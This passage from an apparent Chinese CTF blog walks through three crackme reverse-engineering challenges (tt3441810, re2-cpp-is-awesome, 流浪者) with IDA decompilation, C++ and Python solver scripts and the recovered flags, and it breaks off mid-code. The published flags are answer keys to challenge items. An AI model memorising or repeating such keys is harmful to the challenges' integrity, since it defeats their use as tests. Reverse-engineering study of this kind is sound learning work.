        <content type="html"><![CDATA[<html><head></head><body><p>题目还不是很难，所以还是放在一起来写</p><span id="more"></span><h4 id="tt3441810"><a href="#tt3441810" class="headerlink" title="tt3441810"></a>tt3441810</h4><p>这题并不知道是在干什么，IDA打开是个dumpfile，打开给了很多16进制，看到了<code>0x68</code>这个经典数字（<code>push</code>指令的编码)，后面接了两个字符，看到<code>fl</code>，感觉有问题，找到后面很多个<code>0x68</code>，每个后买你都跟了两个字符，像是把flag<code>push</code>进栈的操作，所以把这些数据导出，然后写个脚本跑一下，验证猜想</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ida_chars[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">0x68</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>,</span><br><span class="line">                    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>,</span><br><span class="line">                    <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>,</span><br><span class="line">                    <span class="hljs-number">0x05</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>,</span><br><span class="line">                    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x01</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x34</span>,</span><br><span class="line">                    <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>,</span><br><span class="line">                    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>,</span><br><span class="line">                    <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>,</span><br><span class="line">                    <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>,</span><br><span class="line">                    <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x0A</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>,</span><br><span class="line">                    <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">                    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span></span><br><span class="line">            };</span><br><span class="line">    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ida_chars)/ <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ida_chars[<span class="hljs-number">0</span>]);</span><br><span class="line">    string flag;</span><br><span class="line">    <span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span>(i!=len) {</span><br><span class="line">        <span class="hljs-keyword">if</span>(ida_chars[i]==<span class="hljs-number">0x68</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">while</span>(ida_chars[++i]!=<span class="hljs-number">0x00</span>)</span><br><span class="line">            {</span><br><span class="line">                flag+=ida_chars[i];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{poppopret}</span></span><br></pre></td></tr></tbody></table></figure><p>提交的时候只需要中间的部分</p><h4 id="re2-cpp-is-awesome"><a href="#re2-cpp-is-awesome" class="headerlink" title="re2-cpp-is-awesome"></a>re2-cpp-is-awesome</h4><p>这题有很多string类，所以还是要慢慢分析</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 i; <span class="hljs-comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+4Fh] [rbp-21h]</span></span><br><span class="line">  __int64 v14; <span class="hljs-comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ( a1 != <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v3 = *a2;</span><br><span class="line">    v4 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Usage: "</span>, a3);</span><br><span class="line">    v6 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v4, v3, v5);</span><br><span class="line">    std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v6, <span class="hljs-string">" flag\n"</span>, v7);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v13, a2, a3);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>(&amp;v12, a2[<span class="hljs-number">1</span>], &amp;v13);</span><br><span class="line">  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v13);</span><br><span class="line">  v15 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">begin</span>(&amp;v12); ; <span class="hljs-built_in">sub_400D7A</span>(&amp;i) )</span><br><span class="line">  {</span><br><span class="line">    v14 = std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">end</span>(&amp;v12);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">sub_400D3D</span>((__int64)&amp;i, (__int64)&amp;v14) )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    v9 = *(<span class="hljs-keyword">unsigned</span> __int8 *)<span class="hljs-built_in">sub_400D9A</span>((__int64)&amp;i);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v9 != off_6020A0[dword_6020C0[v15]] )</span><br><span class="line">      <span class="hljs-built_in">sub_400B56</span>((__int64)&amp;i, (__int64)&amp;v14, v9);</span><br><span class="line">    ++v15;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">sub_400B73</span>((__int64)&amp;i, (__int64)&amp;v14, v8);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v12);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>真正有用的内容只有一个for循环，在这之前我们输入的字符串被传入了<code>v12</code>，然后用迭代器进行循环，遍历整个字符串，每个字符被赋值给了<code>v9</code>，然后进行判断，如果判断可以通过，我们输入的就是正确的flag，判断的条件是<code>v9 = off_6020A0[dword_6020C0[v15]]</code>，一个嵌套索引，把数据导出之后很容易得到结果</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="hljs-string">"L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t"</span></span><br><span class="line">dword_6020C0 = [<span class="hljs-number">36</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">54</span>, <span class="hljs-number">101</span>, <span class="hljs-number">7</span>, <span class="hljs-number">39</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">101</span>, <span class="hljs-number">3</span>, <span class="hljs-number">45</span>, <span class="hljs-number">22</span>, <span class="hljs-number">2</span>, <span class="hljs-number">21</span>, <span class="hljs-number">3</span>, <span class="hljs-number">101</span>, <span class="hljs-number">0</span>, <span class="hljs-number">41</span>, <span class="hljs-number">68</span>, <span class="hljs-number">68</span>,</span><br><span class="line">                <span class="hljs-number">1</span>, <span class="hljs-number">68</span>, <span class="hljs-number">43</span>]</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dword_6020C0:</span><br><span class="line">    <span class="hljs-comment"># print(i)</span></span><br><span class="line">    flag += target[i]</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出结果</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">ALEXCTF</span>{W<span class="hljs-number">3</span>_L<span class="hljs-number">0</span>v<span class="hljs-number">3</span>_C_W<span class="hljs-number">1</span>th_CL<span class="hljs-number">45535</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h4><p>这题是MFC，题目中的函数很多，打开发现输入有错误提示，还是从字符串入手，找到了几个很有用的函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">BOOL __cdecl <span class="hljs-title">sub_4017F0</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  BOOL result; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Str1[<span class="hljs-number">28</span>]; <span class="hljs-comment">// [esp+D8h] [ebp-24h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+F8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  v3 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( *(_DWORD *)(a1 + <span class="hljs-number">4</span> * v4) &lt; <span class="hljs-number">62</span> &amp;&amp; *(_DWORD *)(a1 + <span class="hljs-number">4</span> * v4) &gt;= <span class="hljs-number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    Str1[v4] = alphabet[*(_DWORD *)(a1 + <span class="hljs-number">4</span> * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  }</span><br><span class="line">  Str1[v4] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(Str1, <span class="hljs-string">"KanXueCTF2019JustForhappy"</span>) )</span><br><span class="line">    result = <span class="hljs-built_in">pass</span>();</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    result = <span class="hljs-built_in">fail</span>();</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>更改了一些函数和变量名，更容易辨认，这个函数传入了<code>a1</code>之后，对<code>a1</code>之后的地址上的内容作为索引值依次连接组成了一个新的字符串，所以<code>a1</code>显然应该是一个地址，或者说是一个数组的首地址，而这个数组的内容我们很容易就可以得到，接着再看到底在哪里引用了这个函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">sub_401890</span><span class="hljs-params">(CWnd *<span class="hljs-keyword">this</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CString</span> *<span class="hljs-title">v1</span>;</span> <span class="hljs-comment">// ST08_4</span></span><br><span class="line">  CWnd 